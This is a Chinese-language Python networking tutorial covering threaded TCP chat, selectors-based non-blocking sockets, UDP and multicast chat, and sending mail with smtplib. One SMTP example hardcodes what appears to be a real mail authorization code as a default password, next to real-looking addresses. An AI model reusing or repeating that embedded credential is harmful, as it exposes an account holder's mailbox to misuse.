'''
每个客户端都应该包含两个线程,其中一个负责读取用户的键盘输入内容,并将用户输入的数据输出到socket中,另一个负责读取socket中的数据即从服务器端发送过来的数据,并将这些数据打印输出。由程序的主线程负责读取用户的键盘输入内容,然后将该内容发送到socket中,实际上就是把数据发送给服务器端,由新线程负责读取socket数据
当主线程的socket连接到服务器端之后,以read_from_server()函数为target启动了新线程来处理socket通信,read_from_server()函数使用死循环读取 socket 中的数据(就是来自服务器端的数据),并将这些内容在控制台打印出来

'''
import socket
import threading

s = socket.socket()                 # 创建socket对象
s.connect(('192.168.1.88', 30000))  # 连接远程主机,'0.0.0.0'

def read_from_server(s):
    while True:
        print(s.recv(2048).decode('utf-8'))

# 客户端启动线程循环不断地读取来自服务器的数据
threading.Thread(target=read_from_server, args=(s, )).start()   # ①

while True:
    line = input('')
    if line is None or line == 'exit': break
    s.send(line.encode('utf-8'))  # 将用户的键盘输入内容写入socket

</textarea>群聊<textarea>
### 群聊服务器
'''
群聊服务器没有限制请求连接的用户个数(listen())
每个请求连接的用户socket都将被群聊服务器添加到列表：socket_clientlist
群聊服务器由线程不断读取已连接用户的输入信息并进行广播
服务器收到群成员发送的消息后,向socket_clientlist中保存的所有用户socket,也就是所有群成员群发这条消息,就完成了一个成员把消息发送到群聊的功能,模拟了群聊
'''
import threading, socket

socket_clientlist = []        # 保存所有连接到服务器的不同客户端socket,类似群聊成员名单

def server_deal(client_soc):  # 循环读取socket中的消息
    while True:
        try:
            clientmsg = client_soc.recv(1024).decode('utf-8')
        except:
            socket_clientlist.remove(client_soc)  # 发生异常则说明该socket的客户端已关闭,将其从列表中清除
        print(clientmsg)
        for clientx in socket_clientlist:
            clientx.send(('群消息：\n' + clientmsg).encode('utf-8'))

ss = socket.socket()          # 创建服务器端socket实例
ss.bind(('localhost', 9800))  # 绑定服务器ip与端口到socket实例
ss.listen()                   # 服务器端监听客户端的连接,不限个数
print('正在等待与加入群聊')

# 主程序:等待用户连接服务器
while True:
    sock, addr = ss.accept()            # accept会阻塞直到有客户端请求连接
    print('用户%s加入群聊' % str(sock))
    socket_clientlist.append(sock)      # 将请求连接的客户端socket加入到服务器广播列表
    threading.Thread(target=server_deal, args=(sock,)).start()  # 为每个客户端绑定一个线程用于不停接收该客户端的信息

### 群聊客户端
'''
主进程不断接收用户输入信息并进行发送
子线程不断接收群聊服务器广播的信息
'''
import threading, socket

# 循环读取来自群聊服务端的信息
def read_servermsg(server_soc):
    while True:
        print(server_soc.recv(1024).decode('utf-8'))

clientsoc = socket.socket()  # 创建用户的socket实例
clientsoc.connect(('localhost', 9800))  # 连接群聊服务器
threading.Thread(target=read_servermsg, args=(clientsoc,)).start()  # 当前客户端绑定一个线程用于循环丢来自服务器的信息
# 主程序：用于向群聊中发信息
while True:
    msgtosend = input('')  # 输入群聊信息
    if msgtosend == 'exit': break  # 用户输入exit则退出群聊
    clientsoc.send(('小明： '+ msgtosend).encode('utf-8'))

</textarea>

<h4>selectors模块实现非阻塞式编程</h4><pre>
前面介绍的socket都是采用阻塞方式进行通信的,当程序调用recv()方法从socket中读取数据时,如果没有读取到有效的数据,当前线程就会被阻塞。为了解决这个问题,上面程序采用了多线程并发编程,即服务器端为每个客户端连接都启动一个单独的线程,不同的线程负责对应的socket的通信工作。

通过selectors模块允许socket以非阻塞方式进行通信,selectors相当于一个事件注册中心,程序只要将socket的所有事件注册给selectors管理,当selectors检测到socket中的特定事件之后,程序就调用相应的监听方法进行处理。

selectors主要支持两种事件:
selectors.EVENT_READ:当socket有数据可读时触发该事件。当有客户端连接进来时也会触发该事件。
selectors.EVENT_WRITE:当socket将要写数据时触发该事件。

使用selectors实现非阻塞式编程的步骤:
1、创建selectors对象。
2、通过selectors对象为socket的selectors.EVENT_READ或selectors.EVENT_WRITE事件注册监听器函数,每当socket有数据需要读写时系统负责触发所注册的监昕器函数。
3、在监听器函数中处理socket通信。

</pre>使用selectors模块实现非阻塞式通信的服务器端<textarea>
'''
通过这种方式避免了采用死循环不断地调用socket的accept()方法来接受客户端连接,也避免了采用死循环不断地调用socket的recv()方法来接收数据。socket的accept()、recv()方法调用都是写在事件监听函数中的,只有当事件(如"有客户端连接进来"事件、"有数据可读"事件)发生时accept()和recv()方法才会被调用,这样就避免了阻塞式编程。
为了不断地提取selectors中的事件,程序最后使用一个死循环不断地调用selectors的select()方法"监测"事件,每当监测到相应的事件之后程序就会调用对应的事件监听函数
'''
import selectors, socket
sel = selectors.DefaultSelector()  # 创建默认的selectors对象

# 负责监听"有数据可读"事件的函数
def read(skt, mask):
    try:
        data = skt.recv(1024)       # 读取数据
        if data:
            for s in socket_list:   # 将读取的数据采用循环向每个socket发送一次
                s.send(data)        # Hope it won't block
        else:                       # 如果该socket已被对方关闭,关闭该socket,并从socket_list列表中删除
            print('关闭', skt)
            sel.unregister(skt)
            skt.close()
            socket_list.remove(skt)
    except:                         # 如果捕捉到异常, 将该socket关闭,并从socket_list列表中删除
        print('关闭', skt)
        sel.unregister(skt)
        skt.close()
        socket_list.remove(skt)

socket_list = []

# 负责监听"客户端连接进来"事件的函数
def accept(sock, mask):
    conn, addr = sock.accept()
    socket_list.append(conn)                        # 使用socket_list保存代表客户端的socket
    conn.setblocking(False)
    sel.register(conn, selectors.EVENT_READ, read)  # 使用sel为conn的EVENT_READ事件注册read监听函数

sock = socket.socket()
sock.bind(('192.168.1.88', 30000))                  # '0.0.0.0'
sock.listen()
sock.setblocking(False)                             # 设置该socket是非阻塞的
sel.register(sock, selectors.EVENT_READ, accept)    # 使用sel为sock的EVENT_READ事件注册accept监听函数

# 采用死循环不断提取sel的事件
while True:
    events = sel.select()                           # 监听sel事件
    for key, mask in events:
        callback = key.data                         # key的data属性获取为该事件注册的监听函数
        callback(key.fileobj, mask)                 # 调用监听函数,key的fileobj属性获取被监听的socket对象

</textarea>客户端程序只需要读取socket中的数据,因此只要使用selectors为socket注册"有数据可读"事件的监听函数即可<textarea>
import selectors, socket, threading
sel = selectors.DefaultSelector()  # 创建默认的selectors对象

# 负责监听"有数据可读"事件的函数
def read(conn, mask):
    data = conn.recv(1024)         # Should be ready
    if data:
        print(data.decode('utf-8'))
    else:
        print('closing', conn)
        sel.unregister(conn)
        conn.close()

s = socket.socket()                # 创建socket对象
s.connect(('192.168.1.88', 30000)) # 连接远程主机,'127.0.0.1'
s.setblocking(False)               # 设置该socket是非阻塞的
sel.register(s, selectors.EVENT_READ, read) # 使用sel为s的EVENT_READ事件注册read监听函数,这样每当socket中有数据可读时程序就会触发read()函数来读取socket中的数据

# 定义不断读取用户键盘输入的函数
def keyboard_input(s):
    while True:
        line = input('')
        if line is None or line == 'exit':
            break
        s.send(line.encode('utf-8'))          # 将用户的键盘输入内容写入socket

# 采用线程不断读取用户的键盘输入
threading.Thread(target=keyboard_input, args=(s, )).start()

# 采用死循环不断地调用selectors的select()方法"监测"事件,每当监测到相应的事件之后,程序就会调用对应的事件监听函数
while True:
    events = sel.select()           # 获取事件
    for key, mask in events:
        callback = key.data         # key的data属性获取为该事件注册的监听函数
        callback(key.fileobj, mask) # 调用监听函数, key的fileobj属性获取被监听的socket对象

</textarea>

<h4>UDP</h4><pre>
UDP全称User Datagram Protocol,中文名称为用户数据报协议,主要用来支持那些需要在计算机之间传输数据的网络连接。
UDP协议从问世至今已经被使用了很多年,虽然目前UDP协议的应用不如TCP协议广泛,但UDP依然是一种非常实用和可行的网络传输层协议,尤其在一些实时性很强的应用场景中如网络游戏、视频会议等,UDP协议的快速能力更具有独特的魅力。

与TCP协议一样,UDP协议直接位于IP协议之上。实际上IP协议属于OSI参考模型的网络层协议,而UDP协议和TCP协议都属于传输层协议
相比较TCP,UDP是一种不可靠的网络协议,它在通信实例的两端各建立一个socket,但这两个socket之间并没有虚拟链路,它们只是发送、接收数据报的对象。
TCP是建立可靠连接,并且通信双方都可以以流的形式发送数据,而UDP是一种面向非连接的协议,即在正式通信前不必与对方先建立连接,只需要知道对方的IP地址和端口号就可以直接发数据包而不管对方状态,至于对方是否可以接收到这些数据,UDP协议无法控制,所以说UDP是一种不可靠的协议,因为没有建立连接的过程,因此它的通信效率很高,UDP协议适用于一次只传送少量数据、对可靠性要求不高的应用环境

UDP协议的主要作用是完成网络数据流和数据报之间的转换,在信息的发送端UDP协议将网络数据流封装成数据报,然后将数据报发送出去;在信息的接收端UDP协议将数据报转换成实际数据内容。
可以认为UDP协议的socket类似于码头,数据报则类似于集装箱。码头的作用就是负责友送、接收集装箱,而socket的作用则是发送、接收数据报。因此对于基于UDP协议的通信双方而言,没有所谓的客户端和服务器端的概念。

UDP协议和TCP协议简单对比如下:
TCP协议:可靠,传输大小无限制,但需要连接建立时间,差错控制开销大。
UDP协议:不可靠,差错控制开销较小,传输大小限制在64KB以下,不需要建立连接。

服务器绑定UDP端口和TCP端口互不冲突,也就是说UDP的9999端口与TCP的9999端口可以各自绑定。

【 socket发送和接受数据(基于UDP协议) 】
程序在创建socket时可通过type参数指定该socket的类型,如果将该参数指定为SOCK_DGRAM则意味着创建基于UDP协议的socket。
在创建了基于UDP协议的socket之后,程序可以通过如下两个方法来发送和接收数据:
1、socket.sendto(bytes, address):将bytes数据发送到address地址。
2、socket.recvfrom(bufsize[, flags]):接收数据,该方法可以同时返回socket中的数据和数据来源地址。

使用UDP协议的socket在发送数据时必须使用sendto()方法,这是因为程序必须指定发送数据的目标地址,通过address参数指定
由于UDP协议没有建立虚拟链路,因此程序使用socket发送数据报时scoket并不知道将该数据报发送到哪里,必须通过sendto()方法的address参数来指定数据报的目的地,这个目的地的地址会被附加在所发送的数据报上。

使用UDP协议的socket在接收数据时,既可使用普通的recv()方法,也可使用recvfrom()方法。如果程序需要得到数据报的来源则应使用recvfrom()方法
当服务器端(也可以是客户端)接收到一个数据报后,如果想向该数据报的发送者"反馈"一些信息,此时就必须获取数据报的"来源信息",这就要用到了recvfrom()方法,该方法不仅可以获取socket中的数据,也可以获取数据的来源地址,程序就可以通过该来源地址来"反馈"信息。

程序在使用UDP协议进行网络通信时,实际上并没有明显的服务器端和客户端,因为双方都需要先建立一个socket对象用来接收或发送数据报。但实际编程中通常绑定了固定IP地址和端口的socket对象所在的程序被称为服务器,因此该socket应该调用bind()方法被绑定到指定IP地址和端口,这样其他socket(客户端socket)才可向服务器端socket发送数据报,而服务器端socket就可以接收这些客户端数据报,但服务器端无法预先知道各客户端socket的IP地址和端口,因此必须调用recvfrom()方法来获取客户端socket的IP地址和端口。
客户端与服务器端的唯一区别在于,服务器端的IP地址和端口是固定的,所以客户端可以直接将数据报发送给服务器端;而服务器端则需要根据所接收到的数据报来决定"反馈"数据报的目的地

在使用UDP协议进行网络通信时,服务器端无须也无法保存每个客户端的状态,客户端把数据报发送到服务器端后,完全有可能立即退出。但不管客户端是否退出,服务器端都无法知道客户端的状态。

当使用UDP协议时,如果想让一个客户端发送的聊天信息被转发到其他所有的客户端也是可以的,程序可以考虑在服务器端使用list列表来保存所有的客户端信息,每当接收到一个客户端的数据报之后,程序检查该数据报的来源地址是否在list列表中,如果不在就将该来源地址添加到list列表中。这样又涉及一个问题,可能有些客户端发送一个数据报之后,永久地退出了程序,但服务器端依然会将该客户端的IP地址和端口保存在list列表中。
因此程序还需要定义一个定时器,定期检查每个客户端有多长时间没向服务器端发送数据了,如果超过一定的时间比如10分钟该客户端还没有发送数据,则服务器端就将该客户端的IP地址和端口从list列表中删除……总之这种方式需要处理的问题比较多,编程比较烦琐,幸好UDP协议还支持多点广播,Python也为UDP协议的多点广播提供了支持。

</pre>通过UDP协议传输数据<textarea>
### 服务器端
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # 创建Socket,SOCK_DGRAM指定了这个Socket的类型是UDP
s.bind(('127.0.0.1', 9999))  # 服务器绑定端口,绑定端口和TCP一样,但不需要调用listen()方法,而是直接接收来自任何客户端的数据
print('Bind UDP on 9999...')
while True:
    data, addr = s.recvfrom(1024)  # 接收数据,recvfrom()返回数据和客户端地址端口,这样服务器收到数据后直接调用sendto()就可以把数据用UDP发给客户端
    print('Receivedfrom%s:%s.' % addr)
    s.sendto(b'Hello, %s!' % data, addr)
    # 这里省掉了多线程,因为这个例子很简单。

### 客户端使用UDP时,首先仍然创建基于UDP的Socket,然后不需要调用connect(),直接通过sendto()给服务器发数据
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
for data in [b'Michael', b'Tracy', b'Sarah']:
    s.sendto(data, ('127.0.0.1', 9999))  # 发送数据
    print(s.recv(1024).decode('utf-8'))  # 接收数据,从服务器接收数据仍然调用recv()方法
s.close()

# 用两个命令行分别启动服务器和客户端测试:
┌────────────────────────────────────────────────────────┐
│Command Prompt                                    - □ x │
├────────────────────────────────────────────────────────┤
│$ python udp_server.py                                  │
│Bind UDP on 9999...                                     │
│Receivedfrom127.0.0.1:63823...                          │
│Receivedfrom127.0.0.1:63823...                          │
│Receivedfrom127.0.0.1:63823...                          │
│       ┌────────────────────────────────────────────────┴───────┐
│       │Command Prompt                                    - □ x │
│       ├────────────────────────────────────────────────────────┤
│       │$ python udp_client.py                                  │
│       │Welcome!                                                │
│       │Hello, Michael!                                         │
└───────┤Hello, Tracy!                                           │
        │Hello, Sarah!                                           │
        │$                                                       │
        │                                                        │
        │                                                        │
        └────────────────────────────────────────────────────────┘

</textarea>使用UDP协议的socket实现C/S结构的网络通信<textarea>
### 服务器端通过循环1000次来读取socket中的数据报,每当读取到内容之后便向该数据报的发送者发送一条信息
import socket
s = socket.socket(type=socket.SOCK_DGRAM)  # 通过type属性指定创建基于UDP协议的socket
s.bind(('192.168.1.88', 3000))             # 将该socket绑定到本机的指定IP和端口
books = ("疯狂Python讲义","疯狂Kotlin讲义","疯狂Android讲义","疯狂Swift讲义") # 定义一个字符串数组,服务器端发送该数组的元素
for i in range(1000):                      # 采用循环接收数据,该程序可以接收1000个客户端发送过来的数据
    data, addr = s.recvfrom(4096)          # 读取s中的数据和数据的发送地址,定义每个数据报的大小最大为4KB
    print(data.decode('utf-8'))            # 将接收到的内容转换成字符串后输出
    send_data = books[i % 4].encode('utf-8') # 从字符串数组中取出一个元素作为发送数据
    s.sendto(send_data, addr)              # 将数据报发送给addr地址
s.close()

### 客户端采用循环不断地读取用户的键盘输入内容,每当读取到用户输入的内容后就将该内容通过数据报发送出去;接下来再读取来自服务器端socket的数据
import socket
s = socket.socket(type=socket.SOCK_DGRAM)   # 通过type属性指定创建基于UDP协议的socket
while True:                                 # 不断地读取键盘输入
    line = input('')
    if line is None or line == 'exit': break
    data = line.encode('utf-8')
    s.sendto(data, ("192.168.1.88", 3000))  # 发送数据报
    data = s.recv(4096)                     # 读取socket中的数据,每个数据报的大小最大为4KB
    print(data.decode('utf-8'))
s.close()

</textarea><pre>
【 UDP多点广播 】
通过多点广播可以将数据报以广播方式式发送到多个客户端。
若要使用多点广播则需要将数据报发送到一个组目标地址,当数据报发出后整个组的所有主机都能接收到该数据报。IP多点广播或多点发送实现了将单一信息发送给多个接收者的广播,其思想是设置一组特殊的网络地址作为多点广播地址,每一个多点广播地址都被看作一个组,当客户端需要发送和接收广播信息时加入该组即可。

IP协议为多点广播提供了特殊的IP地址,这些IP地址的范围是224.0.0.0~239.255.255.255
在创建了socket对象后,还需要将该socket加入指定的多点广播地址中,socket使用setsockopt()方法加入指定组。
当socket把一个数据报发送到多点广播IP地址时,该数据报将被自动广播到加入该地址的所有socket,该socket既可以将数据报发送到多点广播地址,也可以接收其他主机的广播信息。

如果创建仅用于发送数据报的socket对象则使用默认地址、随机端口即可,但如果创建接收数据报的socket对象则需要将该socket对象绑定到指定端口,否则发送方无法确定发送数据报的目标端口。

支持多点广播的socket还可设置广播信息的TTL(Time-To-Live),该TTL参数用于设置数据报最多可以跨过多少个网络:
当TTL的值为0时指定数据报应停留在本地主机中;
当TTL的值为1时指定将数据报发送到本地局域网中,(默认)
当TTL的值为32时意味着只能将数据报发送到本站点的网络上;
当TTL的值为64时意味着数据报应被保留在本地区;
当TTL的值为128时意味着数据报应被保留在本大洲;
当TTL的值为255时意味着数据报可被发送到所有地方;

使用socket进行多点广播时所有的通信实体都是平等的,它们都将自己的数据报发送到多点广播IP地址,并使用socket接收其他人发迭的广播数据报。

</pre>使用socket实现一个基于广播的多人聊天室。程序只需要一个socket、两个线程,其中socket用于发送和接收数据,主线程负责读取用户的键盘输入内容,并向socket发送数据,子线程则负责从socket中读取数据<textarea>
import time, socket, threading, os
SENDERIP = '192.168.1.88'                 # 定义本机IP地址|端口,'127.0.0.1'
SENDERPORT = 30000
MYGROUP = '230.0.0.1'                     # 定义本程序的多点广播IP地址
s = socket.socket(type=socket.SOCK_DGRAM) # 通过type属性指定创建基于UDP协议的socket
s.bind(('0.0.0.0', SENDERPORT))           # 将socket绑定到0.0.0.0的虚拟IP,由于需要使用该socket对象接收数据报,所以将该socket绑定到固定端口
s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 64)  # 设置广播消息的TTL(Time-To-Live)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)       # 设置允许多点广播使用相同的端口
# 将socket进入广播组,将该socket对象添加到指定的多点广播IP地址
status = s.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, socket.inet_aton(MYGROUP) + socket.inet_aton(SENDERIP))

# 定义从socket读取数据的方法
def read_socket(sock):
    while True:
        data = sock.recv(2048)
        print("信息: ", data.decode('utf-8'))

# 以read_socket作为target启动多线程
threading.Thread(target=read_socket, args=(s, )).start()

# 采用循环不断读取键盘输入,并输出到socket中
while True:
    line = input('')
    if line is None or line == 'exit':
        break
        os._exit(0)
    s.sendto(line.encode('utf-8'), (MYGROUP, SENDERPORT))  # 将line输出到socket中

</textarea>
</div>

<div id="smtp">
<h3>smtplib模块:发送邮件</h3><pre>
【 base 】
email的历史比Web还要久远,直到现在Email也是互联网上应用非常广泛的服务,几乎所有的编程语言都支持发送和接收电子邮件

传统邮件是如何运作的,假设现在在北京,要给一个香港的朋友发一封信,怎么做呢？
首先得写好信,装进信封,写上地址,贴上邮票,然后就近找个邮局,把信仍进去。信件会从就近的小邮局转运到大邮局,再从大邮局往别的城市发,比如先发到天津,再走海运到达香港,也可能走京九线到香港,但是不用关心具体路线,只需要知道一件事,就是信件走得很慢,至少要几天时间。
信件到达香港的某个邮局,也不会直接送到朋友的家里,因为邮局的叔叔是很聪明的,他怕你的朋友不在家,一趟一趟地白跑,所以,信件会投递到你的朋友的邮箱里,邮箱可能在公寓的一层,或者家门口,直到你的朋友回家的时候检查邮箱,发现信件后就可以取到邮件了。
电子邮件的流程基本上也是按上面的方式运作的,只不过速度不是按天算,而是按秒算。

假设自己的电子邮件地址是me@163.com,对方的电子邮件地址是friend@sina.com,现在用Outlook或Foxmail之类的软件写好邮件,填上对方的Email地址,点发送电子邮件就发出去了,这些电子邮件软件被称为MUA:Mail User Agent——邮件用户代理。

Email从MUA发出去不是直接到达对方电脑,而是发到MTA:Mail Transfer Agent——邮件传输代理即那些Email服务提供商如网易、新浪等。电子邮件是163.com则Email首先被投递到网易提供的MTA,再由网易的MTA发到对方服务商也就是新浪的MTA。这个过程中间可能还会经过别的MTA,但不关心具体路线,只关心速度。

Email到达新浪的MTA后,由于对方使用的是@sina.com的邮箱,因此新浪的MTA会把Email投递到邮件的最终目的地MDA:Mail Delivery Agent邮件投递代理。Email到达MDA后就静静地躺在新浪的某个服务器上,存放在某个文件或特殊的数据库里,将这个长期保存邮件的地方称之为电子邮箱。

同普通邮件类似,Email不会直接到达对方的电脑,因为对方电脑不一定开机,开机也不一定联网。对方要取到邮件,必须通过MUA从MDA上把邮件取到自己的电脑上。

所以一封电子邮件的旅程就是:发件人 -> MUA -> MTA -> MTA -> 若干个MTA -> MDA <- MUA <- 收件人
有了上述基本概念,编写程序来发送和接收邮件本质上就是:
编写MUA把邮件发到MTA;
编写MUA从MDA上收邮件。

发邮件时MUA和MTA使用的协议就是SMTP:Simple Mail Transfer Protocol,后面的MTA到另一个MTA也是用SMTP协议。
收邮件时MUA和MDA使用的协议有两种:
1、POP:Post Office Protocol,目前版本是3,俗称POP3;
2、IMAP:Internet Message Access Protocol,目前版本是4,优点是不但能取邮件,还可以直接操作MDA上存储的邮件,比如从收件箱移到垃圾箱等

邮件客户端软件在发邮件时,会让你先配置SMTP服务器即要发到哪个MTA上。假设正在使用163的邮箱就不能直接发到新浪的MTA上,因为它只服务新浪的用户,所以得填163提供的SMTP服务器地址:smtp.163.com,为了证明是163的用户SMTP服务器还要求填写邮箱地址和邮箱口令,这样MUA才能正常地把Email通过SMTP协议发送到MTA。

从MDA收邮件时MDA服务器也要求验证邮箱口令,确保不会有人冒充收取邮件,所以Outlook之类的邮件客户端会要求填写POP3或IMAP服务器地址、邮箱地址和口令,这样MUA才能顺利地通过POP或IMAP协议从MDA取到邮件。

在使用Python收发邮件前,请先准备好至少两个电子邮件,如xxx@163.com,xxx@sina.com,xxx@qq.com等,两个邮箱不要用同一家邮件服务商。

目前大多数邮件服务商都需要手动打开SMTP发信和POP收信的功能,否则只允许在网页登录

</pre>

<h4>SMTP发送邮件</h4><pre>
SMTP(Simple Mail Transfer Protocol)即简单邮件传输协议,是发送邮件的协议,它是一组用于由源地址到目的地址传送邮件的规则,由它来控制信件的中转方式。
Python内置对SMTP的支持,Python对SMTP支持有smtplib和email两个模块
email负责构造邮件
smtplib负责发送邮件,提供了一种很方便的途径发送电子邮件,对smtp协议进行了简单的封装,可以发送纯文本邮件、HTML邮件以及带附件的邮件。

</pre><textarea>
# 构造一个最简单的纯文本邮件,构造MIMEText对象时第一个参数是邮件正文,第二个参数是MIME的subtype,传入'plain'表示纯文本,最终的MIME就是'text/plain',最后一定要用utf-8编码保证多语言兼容性
from email.mime.text import MIMEText
msg = MIMEText('hello, send by Python...', 'plain', 'utf-8')
print(msg)

'''
输出
Content-Type: text/plain; charset="utf-8"
MIME-Version: 1.0
Content-Transfer-Encoding: base64

aGVsbG8sIHNlbmQgYnkgUHl0aG9uLi4u
'''

# 通过SMTP发出去
from_addr = input('From: ') or '465***869@qq.com'        # 输入Email地址和口令
password = input('Password: ') or 'fqfoekytxqkebhah'
to_addr = input('To: ') or 'heiying6958@sina.com'        # 输入收件人地址
smtp_server = input('SMTP server: ') or 'smtp.qq.com'    # 输入SMTP服务器地址

import smtplib
server = smtplib.SMTP(smtp_server, 25)  # SMTP协议默认端口是25
server.set_debuglevel(1)                # 打印出和SMTP服务器交互的所有信息,SMTP协议就是简单的文本命令和响应
server.login(from_addr, password)       # 登录SMTP服务器
server.sendmail(from_addr, [to_addr], msg.as_string())  # 发送邮件,由于可以一次发给多个人,所以传入一个list,邮件正文是一个str,as_string()把MIMEText对象变成str
server.quit()

</textarea>邮件主题、如何显示发件人、收件人等信息并不是通过SMTP协议发给MTA,而是包含在发给MTA的文本中的,所以必须把From、To和Subject添加到MIMEText中才是一封完整的邮件<textarea>
from email import encoders
from email.header import Header
from email.mime.text import MIMEText
from email.utils import parseaddr, formataddr

import smtplib

# 格式化一个邮件地址,不能简单地传入name < addr@example.com>,因为如果包含中文,需要通过Header对象进行编码
def _format_addr(s):
    name, addr = parseaddr(s)
    return formataddr((Header(name, 'utf-8').encode(), addr))

from_addr = input('From: ')
password = input('Password: ')
to_addr = input('To: ')
smtp_server = input('SMTP server: ')

msg = MIMEText('hello, send by Python...', 'plain', 'utf-8')
msg['From'] = _format_addr('Python爱好者 <%s>' % from_addr)
# msg['To']接收的是字符串而不是list,如果有多个邮件地址用,分隔即可
# 显示的收件人的名字很可能不是传入的管理员,因为很多邮件服务商在显示邮件时会把收件人名字自动替换为用户注册的名字,但是其他收件人名字的显示不受影响
msg['To'] = _format_addr('管理员 <%s>' % to_addr)
msg['Subject'] = Header('来自SMTP的问候……', 'utf-8').encode()

server = smtplib.SMTP(smtp_server, 25)
server.set_debuglevel(1)
server.login(from_addr, password)
server.sendmail(from_addr, [to_addr], msg.as_string())
server.quit()

# 查看Email的原始内容,可以看到如下经过编码的邮件头:
From: =?utf-8?b?UHl0aG9u54ix5aW96ICF?= < xxxxxx@163.com>
To: =?utf-8?b?566h55CG5ZGY?= < xxxxxx@qq.com>
Subject: =?utf-8?b?5p2l6IeqU01UUOeahOmXruWAmeKApuKApg==?=
这就是经过Header对象编码的文本,包含utf-8编码信息和Base64编码的文本。如果自己来手动构造这样的编码文本,显然比较复杂

</textarea><pre>
Python创建SMTP对象语法如下:
import smtplib
smtpObj = smtplib.SMTP( [host [, port [, local_hostname]]] )

参数说明:
host: SMTP服务器主机,可以指定主机的ip地址或域名如runoob.com,这个是可选参数
port: 如果提供了host参数,需要指定SMTP服务使用的端口号,一般情况下SMTP端口号为25
local_hostname: 如果SMTP在本机上,只需要指定服务器地址为localhost即可

Python SMTP对象使用sendmail方法发送邮件,语法如下:
smtpObj.sendmail(from_addr, to_addrs, msg[, mail_options, rcpt_options])

参数说明:
from_addr: 邮件发送者地址
to_addrs: 字符串列表,邮件发送地址
msg: 发送消息,msg是字符串,表示邮件。邮件一般由标题、发信人、收件人、邮件内容、附件等构成,发送邮件的时候要注意msg的格式。这个格式就是smtp协议中定义的格式。

</pre>以下执行实例需要本机已安装了支持SMTP的服务如sendmail,以下是一个使用Python发送邮件简单的实例<textarea>
#!/usr/bin/python
# -*- coding: UTF-8 -*-

import smtplib
from email.mime.text import MIMEText
from email.header import Header

sender = 'from@runoob.com'
receivers = ['429240967@qq.com']  # 接收邮件,可设置为QQ邮箱或其他邮箱

# 三个参数:第一个为文本内容,第二个plain设置文本格式,第三个utf-8设置编码
message = MIMEText('Python邮件发送测试...', 'plain', 'utf-8')
message['From'] = Header("菜鸟教程", 'utf-8')   # 发送者
message['To'] =  Header("测试", 'utf-8')        # 接收者

subject = 'Python SMTP邮件测试'
message['Subject'] = Header(subject, 'utf-8')

try:
    smtpObj = smtplib.SMTP('localhost')
    smtpObj.sendmail(sender, receivers, message.as_string())
    print("邮件发送成功")
except smtplib.SMTPException:
    print("Error: 无法发送邮件")

</textarea><pre>
使用三个引号来设置邮件信息,标准邮件需要三个头部信息:From、To和Subject,每个信息直接使用空行分割。
通过实例化smtplib模块的SMTP对象smtpObj来连接到SMTP访问,并使用sendmail方法来发送信息。

执行以上程序,如果本机安装sendmail(邮件传输代理程序)就会输出:
$ python test.py
邮件发送成功
查看收件箱(一般在垃圾箱)就可以查看到邮件信息

</pre>如果本机没有sendmail访问,也可以使用其他邮件服务商的SMTP访问(QQ、网易、Google等)<textarea>
#!/usr/bin/python
# -*- coding: UTF-8 -*-

import smtplib
from email.mime.text import MIMEText
from email.header import Header

# 第三方SMTP服务
mail_host="smtp.XXX.com"  # 设置服务器
mail_user="XXXX"          # 用户名
mail_pass="XXXXXX"        # 口令

sender = 'from@runoob.com'
receivers = ['429240967@qq.com']  # 接收邮件,可设置为QQ邮箱或其他邮箱

message = MIMEText('Python 邮件发送测试...', 'plain', 'utf-8')
message['From'] = Header("菜鸟教程", 'utf-8')
message['To'] =  Header("测试", 'utf-8')

subject = 'Python SMTP邮件测试'
message['Subject'] = Header(subject, 'utf-8')

try:
    smtpObj = smtplib.SMTP()
    smtpObj.connect(mail_host, 25)    # 25为SMTP端口号
    smtpObj.login(mail_user,mail_pass)
    smtpObj.sendmail(sender, receivers, message.as_string())
    print("邮件发送成功")
except smtplib.SMTPException:
    print("Error: 无法发送邮件")

</textarea><pre>
【 使用第三方SMTP服务发送 】
这里使用了QQ邮箱(也可以使用163,Gmail等)的SMTP服务,需要做配置
QQ邮箱通过生成授权码来设置密码
QQ邮箱SMTP服务器地址:smtp.qq.com,ssl 端口:465。
以下实例需要修改:发件人邮箱(QQ邮箱),密码,收件人邮箱(可发给自己)

</pre><textarea>
import smtplib
from email.mime.text import MIMEText
from email.utils import formataddr

my_sender='429240967@qq.com'    # 发件人邮箱账号
my_pass = 'xxxxxxxxxx'          # 发件人邮箱密码
my_user='429240967@qq.com'      # 收件人邮箱账号,我这边发送给自己
def mail():
    ret=True
    try:
        msg=MIMEText('填写邮件内容','plain','utf-8')
        msg['From']=formataddr(["FromRunoob",my_sender])       # 括号里的对应发件人邮箱昵称、发件人邮箱账号
        msg['To']=formataddr(["FK",my_user])                   # 括号里的对应收件人邮箱昵称、收件人邮箱账号
        msg['Subject']="菜鸟教程发送邮件测试"                    # 邮件的主题,也可以说是标题

        server=smtplib.SMTP_SSL("smtp.qq.com", 465)            # 发件人邮箱中的SMTP服务器,端口是25
        server.login(my_sender, my_pass)                       # 括号中对应的是发件人邮箱账号、邮箱密码
        server.sendmail(my_sender,[my_user,],msg.as_string())  # 括号中对应的是发件人邮箱账号、收件人邮箱账号、发送邮件
        server.quit()                                          # 关闭连接
    except Exception:                                          # 如果try中的语句没有执行,则会执行下面的ret=False
        ret=False
    return ret

ret=mail()
if ret:
    print("邮件发送成功")
else:
    print("邮件发送失败")

### $ python test.py
邮件发送成功
发送成功后,登陆收件人邮箱即可查看

</textarea>使用Python发送HTML格式的邮件,邮件内容为html: Python发送HTML格式的邮件与发送纯文本消息的邮件不同之处就是将MIMEText中'plain'替换为为'html'<textarea>
import smtplib
from email.mime.text import MIMEText
from email.header import Header

sender = 'from@runoob.com'
receivers = ['429240967@qq.com']  # 接收邮件,可设置为QQ邮箱或其他邮箱

mail_msg = """
<p>Python 邮件发送测试...</p>
<p><a href="http://www.runoob.com">这是一个链接</a></p>
"""
message = MIMEText(mail_msg, 'html', 'utf-8')
message['From'] = Header("菜鸟教程", 'utf-8')
message['To'] =  Header("测试", 'utf-8')

subject = 'Python SMTP 邮件测试'
message['Subject'] = Header(subject, 'utf-8')

try:
    smtpObj = smtplib.SMTP('localhost')
    smtpObj.sendmail(sender, receivers, message.as_string())
    print("邮件发送成功")
